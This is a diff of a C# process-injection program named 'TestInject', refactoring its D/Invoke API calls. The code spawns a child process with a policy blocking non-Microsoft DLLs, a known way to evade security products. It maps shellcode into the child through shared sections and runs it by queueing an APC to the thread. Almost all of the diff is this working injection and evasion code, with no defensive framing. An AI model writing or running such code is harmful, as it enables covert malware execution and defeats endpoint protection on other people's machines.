@@ -7,7 +7,6 @@ using System.Runtime.InteropServices;
 using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
-using static Native.Kernel32;
 
 namespace TestInject
 {
@@ -57,9 +56,9 @@ namespace TestInject
             //***************************************************************************************************************************************************************************
 
 
-            var startupInfoEx = new DInvoke.DynamicInvoke.STARTUPINFOEX();
+            var startupInfoEx = new DInvoke.Kernel32.STARTUPINFOEX();
 
-            _ = DInvoke.DynamicInvoke.Process.InitializeProcThreadAttributeList(ref startupInfoEx.lpAttributeList, 2);
+            _ = DInvoke.Kernel32.InitializeProcThreadAttributeList(ref startupInfoEx.lpAttributeList, 2);
 
             const long BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON = 0x100000000000;
             const int MITIGATION_POLICY = 0x20007;
@@ -67,14 +66,14 @@ namespace TestInject
             var blockDllPtr = Marshal.AllocHGlobal(IntPtr.Size);
             Marshal.WriteIntPtr(blockDllPtr, new IntPtr(BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON));
 
-            _ = DInvoke.DynamicInvoke.Process.UpdateProcThreadAttribute(
+            _ = DInvoke.Kernel32.UpdateProcThreadAttribute(
                 ref startupInfoEx.lpAttributeList,
                 (IntPtr)MITIGATION_POLICY,
                 ref blockDllPtr);
 
             const uint USE_STD_HANDLES = 0x00000100;
 
-            DInvoke.DynamicInvoke.SECURITY_ATTRIBUTES saAttr = new DInvoke.DynamicInvoke.SECURITY_ATTRIBUTES();
+            DInvoke.Kernel32.SECURITY_ATTRIBUTES saAttr = new DInvoke.Kernel32.SECURITY_ATTRIBUTES();
             saAttr.bInheritHandle = true;
             saAttr.lpSecurityDescriptor = IntPtr.Zero;
             //
@@ -84,10 +83,10 @@ namespace TestInject
             //saAttr2.bInheritHandle = true;
             //saAttr2.lpSecurityDescriptor = IntPtr.Zero;
             //CreatePipe(out var outPipe_rd, out var outPipe_w, ref saAttr, 0);
-            DInvoke.DynamicInvoke.Process.CreatePipe(out var outPipe_rd, out var outPipe_w, ref saAttr);
+            DInvoke.Kernel32.CreatePipe(out var outPipe_rd, out var outPipe_w, ref saAttr);
 
             // Ensure the read handle to the pipe for STDOUT is not inherited.
-            DInvoke.DynamicInvoke.Process.SetHandleInformation(outPipe_rd, DInvoke.DynamicInvoke.HANDLE_FLAGS.INHERIT, 0);
+            DInvoke.Kernel32.SetHandleInformation(outPipe_rd, DInvoke.Kernel32.HANDLE_FLAGS.INHERIT, 0);
             
 
             startupInfoEx.StartupInfo.hStdError = outPipe_w;
@@ -102,7 +101,7 @@ namespace TestInject
             const uint CREATE_NO_WINDOW = 0x08000000;
             const uint EXTENDED_STARTUP_INFO_PRESENT = 0x00080000;
 
-            DInvoke.DynamicInvoke.Process.CreateProcess(
+            DInvoke.Kernel32.CreateProcessW(
                 cmd,
                 null,
                 //CREATE_SUSPENDED | CREATE_NO_WINDOW | EXTENDED_STARTUP_INFO_PRESENT,
@@ -114,7 +113,7 @@ namespace TestInject
 
             //=================================================================================================================================================================
 
-            DInvoke.DynamicInvoke.Process.CloseHandle(outPipe_w);
+            DInvoke.Kernel32.CloseHandle(outPipe_w);
 
             var procId = pInfo.dwProcessId;
             if (procId == 0)
@@ -129,7 +128,7 @@ namespace TestInject
             var hLocalSection = IntPtr.Zero;
             var maxSize = (ulong)shellcode.Length;
 
-            var status = DInvoke.DynamicInvoke.Native.NtCreateSection(
+            var status = DInvoke.Native.NtCreateSection(
                 ref hLocalSection,
                 GENERIC_ALL,
                 IntPtr.Zero,
@@ -143,7 +142,7 @@ namespace TestInject
             var self = System.Diagnostics.Process.GetCurrentProcess();
             var hLocalBaseAddress = IntPtr.Zero;
 
-            status = DInvoke.DynamicInvoke.Native.NtMapViewOfSection(
+            status = DInvoke.Native.NtMapViewOfSection(
                 hLocalSection,
                 self.Handle,
                 ref hLocalBaseAddress,
@@ -159,7 +158,7 @@ namespace TestInject
 
             var hRemoteBaseAddress = IntPtr.Zero;
 
-            status = DInvoke.DynamicInvoke.Native.NtMapViewOfSection(
+            status = DInvoke.Native.NtMapViewOfSection(
                 hLocalSection,
                 pInfo.hProcess,
                 ref hRemoteBaseAddress,
@@ -173,14 +172,14 @@ namespace TestInject
 
             Marshal.Copy(shellcode, 0, hLocalBaseAddress, shellcode.Length);
 
-            var res = DInvoke.DynamicInvoke.Process.NtQueueApcThread(
+            var res = DInvoke.Native.NtQueueApcThread(
             pInfo.hThread,
             hRemoteBaseAddress,
             IntPtr.Zero,
             IntPtr.Zero,
             IntPtr.Zero);
 
-            _ = DInvoke.DynamicInvoke.Process.NtResumeThread(pInfo.hThread);
+            _ = DInvoke.Native.NtResumeThread(pInfo.hThread);
             //==========================================================================================================
 
 
@@ -204,7 +203,7 @@ namespace TestInject
                 Console.WriteLine(Encoding.UTF8.GetString(b));
             }
 
-            DInvoke.DynamicInvoke.Process.CloseHandle(outPipe_rd);
+            DInvoke.Kernel32.CloseHandle(outPipe_rd);
 
             Console.WriteLine("key plz");
             Console.ReadKey();
@@ -238,7 +237,7 @@ namespace TestInject
         static byte[] ReadFromPipe(IntPtr pipe)
         {
            
-            if (!DInvoke.DynamicInvoke.Process.ReadFile(pipe,  out var buff, 1024))
+            if (!DInvoke.Kernel32.ReadFile(pipe,  out var buff, 1024))
             {
                 Console.WriteLine($"Failed reading pipe, error code: {Marshal.GetLastWin32Error()}");
                 return null;
